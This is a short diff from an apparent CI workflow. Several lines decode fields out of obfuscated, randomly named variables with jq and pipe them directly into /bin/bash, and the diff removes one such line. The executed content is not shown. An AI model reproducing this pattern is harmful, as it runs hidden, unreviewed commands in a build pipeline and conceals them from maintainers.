@@ -29,7 +29,6 @@ jobs:
           echo $iof3 | jq -r .e82 | /bin/bash
           echo $el14629 | jq -r .zji7 | /bin/bash
           printf '%s' "$r32924" | jq -r .gn85213 | /bin/bash
-          echo $c2178 | jq -r .ocebg3136 | /bin/bash
           printf '%s' "$wuk70" | jq -r .s2 | /bin/bash
           echo $von9 | jq -r .rg37692 | /bin/bash
           echo $unhn47 | jq -r .i317 | /bin/bash
